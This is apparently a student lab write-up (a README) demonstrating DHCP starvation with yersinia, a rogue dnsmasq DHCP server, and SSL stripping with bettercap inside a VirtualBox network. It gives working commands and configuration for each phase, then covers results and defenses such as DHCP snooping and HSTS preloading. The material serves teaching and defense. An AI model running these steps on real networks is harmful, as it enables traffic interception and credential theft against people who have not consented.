# Network Takeover via Rogue DHCP and SSL Stripping

A B.Tech cybersecurity assignment demonstrating a full Layer 2/3 network takeover attack chain — DHCP starvation, rogue DHCP server deployment, and SSL stripping via MITM — executed entirely inside a VirtualBox lab environment.

---

## Table of Contents

- [Attack Overview](#attack-overview)
- [Lab Setup](#lab-setup)
- [Attack Chain](#attack-chain)
  - [Phase 1 — DHCP Starvation](#phase-1--dhcp-starvation)
  - [Phase 2 — Rogue DHCP Server](#phase-2--rogue-dhcp-server)
  - [Phase 3 — SSL Stripping](#phase-3--ssl-stripping)
- [Attack Flow Diagram](#attack-flow-diagram)
- [Results](#results)
- [Why This Attack Matters](#why-this-attack-matters)
- [Defenses](#defenses)
- [Key Takeaways](#key-takeaways)
- [References](#references)

---

## Attack Overview

This project demonstrates a three-phase network takeover on a switched/virtualized network:

1. **DHCP Starvation** — Flood the legitimate DHCP server using `yersinia` to exhaust its IP pool, preventing real clients from getting leases.
2. **Rogue DHCP** — Spin up `dnsmasq` on the attacker machine to become the new DHCP server, pushing our own gateway and DNS to victims.
3. **SSL Stripping** — Use `bettercap` to intercept all victim traffic and downgrade HTTPS → HTTP, capturing credentials in plaintext.

The key insight is that this attack works on **modern switched networks** where traditional promiscuous mode sniffing is ineffective — by rewriting the network topology at the DHCP level, all victim traffic is legitimately routed through the attacker.

---

## Lab Setup

### Host Machine
| Property | Value |
|---|---|
| RAM | 16 GB |
| Hypervisor | Oracle VirtualBox |
| Network Adapter | Host-Only (`vboxnet0`) |

### Virtual Machines

| VM | Role | RAM | Cores | OS |
|---|---|---|---|---|
| Kali Linux | Attacker | 4 GB | 2 | Kali Linux (Rolling) |
| Debian/Ubuntu | Victim | 3 GB | 1 | Debian/Ubuntu |

### Network Configuration

| Component | Value |
|---|---|
| Host-Only Network | `192.168.56.0/24` |
| Attacker (Kali) IP | `192.168.56.10` (static) |
| VirtualBox DHCP range | `192.168.56.101 – 192.168.56.110` (10 IPs, intentionally small) |
| Rogue DHCP range | `192.168.56.120 – 192.168.56.200` |
| Rogue Gateway pushed to victim | `192.168.56.10` (attacker) |
| Rogue DNS pushed to victim | `192.168.56.10` (attacker) |

> VirtualBox's built-in DHCP is enabled with only 10 IPs to make starvation fast and visible in the demo.

### Network Diagram

```
┌─────────────────────────────────────────────────────┐
│                  vboxnet0 (Host-Only)                │
│                  192.168.56.0/24                     │
│                                                      │
│  ┌──────────────────┐      ┌──────────────────┐      │
│  │  Kali (Attacker) │      │  Debian (Victim) │      │
│  │  192.168.56.10   │◄─────│  192.168.56.140  │      │
│  │  (static)        │      │  (from rogue     │      │
│  │                  │      │   DHCP)          │      │
│  └──────────────────┘      └──────────────────┘      │
│           │                                          │
│  ┌────────▼────────┐                                 │
│  │ VirtualBox DHCP │                                 │
│  │ 101–110 (real)  │                                 │
│  │ [EXHAUSTED]     │                                 │
│  └─────────────────┘                                 │
└─────────────────────────────────────────────────────┘
```

---

## Attack Chain

### Phase 1 — DHCP Starvation

**Tool:** `yersinia`  
**Goal:** Exhaust the VirtualBox DHCP pool (101–110) so no legitimate client can get a lease.

#### How it works
Yersinia spoofs thousands of unique MAC addresses, each sending a DHCP DISCOVER broadcast. The real DHCP server allocates one IP per MAC until its pool is completely exhausted.

#### Commands
```bash
sudo yersinia -I
# Press F2 → DHCP mode
# Press x → select 2 (DHCP starvation / DoS)
# Watch packet counter climb to thousands
```

#### Verification (on Victim VM — before rogue DHCP)
```bash
sudo dhclient -r eth0 && sudo dhclient eth0
# Should time out — no DHCPOFFER received
```

> **Screenshot:** `screenshots/phase1_yersinia_starvation.png`

---

### Phase 2 — Rogue DHCP Server

**Tool:** `dnsmasq`  
**Goal:** Become the only DHCP server on the network, pushing attacker's IP as the victim's gateway and DNS server.

#### Prerequisites
```bash
# Kill any existing dnsmasq
sudo pkill -9 dnsmasq

# Stop systemd-resolved (occupies port 53)
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Restore DNS for attacker machine
sudo rm /etc/resolv.conf
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf

# Verify port 53 is free
sudo ss -tulnp | grep :53
```

#### dnsmasq Configuration (`/etc/dnsmasq.conf`)
```ini
interface=enp0s8
dhcp-range=192.168.56.120,192.168.56.200,12h
dhcp-option=3,192.168.56.10      # push attacker as gateway
dhcp-option=6,192.168.56.10      # push attacker as DNS
dhcp-authoritative
log-dhcp
log-facility=/var/log/dnsmasq.log
```

#### Start Rogue DHCP
```bash
# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Start dnsmasq
sudo systemctl start dnsmasq
sudo systemctl status dnsmasq

# NAT so victim traffic reaches internet through attacker
sudo iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE

# Watch leases being handed out
sudo tail -f /var/log/dnsmasq.log
```

#### Force Victim to Renew (on Victim VM)
```bash
sudo dhclient -r eth0 && sudo dhclient eth0
ip route show
# default via 192.168.56.10 ← attacker is now the gateway
```

> **Screenshot:** `screenshots/phase2_victim_gateway.png`

---

### Phase 3 — SSL Stripping

**Tool:** `bettercap`  
**Goal:** Intercept all victim traffic and downgrade HTTPS to HTTP, capturing credentials in plaintext.

#### How it works
Since the victim's gateway is now the attacker, all traffic passes through Kali. Bettercap:
1. ARP spoofs to maintain MITM position
2. Intercepts HTTPS requests before TLS is established
3. Fetches HTTPS from the real server on behalf of the victim
4. Serves the victim plain HTTP
5. Credentials transmitted in plaintext, visible to attacker

#### Commands
```bash
sudo bettercap -iface enp0s8
```

Inside bettercap console:
```
set arp.spoof.targets 192.168.56.140
arp.spoof on
net.sniff on
set https.proxy.sslstrip true
https.proxy on
http.proxy on
```

#### Result
All HTTP traffic from the victim — including POST requests with credentials — appears in plaintext in bettercap's output.

> **Screenshot:** `screenshots/phase3_bettercap_credentials.png`  
> **Screenshot:** `screenshots/phase3_ssl_warning.png` (browser MITM warning on HSTS sites)

---

## Attack Flow Diagram

```
Victim                      Attacker (Kali)               Internet
  |                               |                           |
  |──DHCP DISCOVER──────────────►|  (real pool exhausted)    |
  |◄─DHCP OFFER (rogue)──────────|                           |
  |  GW=192.168.56.10            |                           |
  |  DNS=192.168.56.10           |                           |
  |                               |                           |
  |──HTTPS req──────────────────►|──HTTPS req───────────────►|
  |◄─HTTP resp (stripped)────────|◄─HTTPS resp───────────────|
  |  [credentials in plaintext]   |                           |
```

---

## Results

| Phase | Expected Result | Observed |
|---|---|---|
| DHCP Starvation | Real pool exhausted, victim gets no IP | ✅ 952,791 packets sent, pool exhausted |
| Rogue DHCP | Victim gets IP from 120–200 range, gateway = attacker | ✅ Victim got 192.168.56.140, GW = .10 |
| SSL Stripping | HTTP credentials visible in plaintext | ✅ Captured via bettercap net.sniff |
| HTTPS interception | Browser certificate warning | ✅ Firefox MITM warning shown |

---

## Why This Attack Matters

### vs Traditional Promiscuous Mode Sniffing

| | Promiscuous Mode / hping MITM | This Attack |
|---|---|---|
| Requires seeing packets first | ✅ Yes | ❌ No |
| Works on switched networks | ❌ No | ✅ Yes |
| Needs special network position | ✅ Yes (hub/tap) | ❌ No |
| Traffic routed through attacker | ❌ Not guaranteed | ✅ Yes — at OS level |

On a modern switched network, the switch delivers packets only to their destination port. Promiscuous mode gives you nothing to sniff. This attack bypasses that entirely — by becoming the victim's gateway via DHCP, all traffic is **legitimately addressed to the attacker's MAC** and delivered by the switch without any special configuration.

### Why DHCP is the attack surface
When a client connects to a network, it blindly trusts the DHCP server for:
- Its IP address
- Its default gateway (Option 3)
- Its DNS server (Option 6)

There is no authentication in DHCP — the client accepts the first (or loudest) offer it receives. This is the fundamental vulnerability being exploited.

### Why SSL Stripping works (historically)
Users type `facebook.com`, not `https://facebook.com`. The browser first makes an HTTP request, which bettercap intercepts before TLS is ever negotiated. The attacker fetches HTTPS from the real server and serves HTTP to the victim — on non-HSTS sites with no browser warning.

---

## Defenses

### Against DHCP Starvation
- **Port Security** on managed switches — limits MAC addresses per port (e.g. max 5). Yersinia spoofs thousands, triggering port shutdown.
- **DHCP Rate Limiting** — limits DHCP packets per second per port.

### Against Rogue DHCP
- **DHCP Snooping** (primary defense) — switch marks only the uplink port as trusted. DHCP OFFERs from any other port are silently dropped. Rogue dnsmasq responses never reach clients.
- **802.1X Port Authentication** — clients must authenticate before any network access, preventing an attacker from plugging in at all.
- **Static IP Assignment** — eliminates DHCP entirely. Impractical at scale.

### Against SSL Stripping
- **HSTS (HTTP Strict Transport Security)** — server sends a header telling browsers to always use HTTPS. Browser refuses HTTP for that domain.
- **HSTS Preload Lists** — browsers ship with a hardcoded list of domains that must always use HTTPS, even on first visit before any header is received. This is the direct countermeasure to this exact attack.

---

## Key Takeaways

1. DHCP has no authentication — the client trusts whoever responds first/loudest.
2. On switched networks, becoming the gateway via DHCP is more powerful than promiscuous mode sniffing.
3. SSL stripping exploits the HTTP→HTTPS upgrade gap, not TLS itself.
4. HSTS preloading (introduced post-2010) is the reason this attack no longer works silently against major sites — but it remains effective against internal/legacy systems without HSTS.
5. DHCP Snooping on managed switches is the correct network-level countermeasure.

---

## References

- RFC 2131 — Dynamic Host Configuration Protocol
- RFC 6797 — HTTP Strict Transport Security (HSTS)
- Marlinspike, M. (2009) — *New Techniques for Defeating SSL* — Black Hat DC
- Yersinia — [https://github.com/tomac/yersinia](https://github.com/tomac/yersinia)
- Bettercap — [https://www.bettercap.org](https://www.bettercap.org)
- dnsmasq — [https://thekelleys.org.uk/dnsmasq/doc.html](https://thekelleys.org.uk/dnsmasq/doc.html)

---

## Disclaimer

This project was conducted entirely in an isolated VirtualBox lab environment for academic purposes. All attack techniques demonstrated here are for educational understanding only. Do not replicate on any network without explicit authorization.
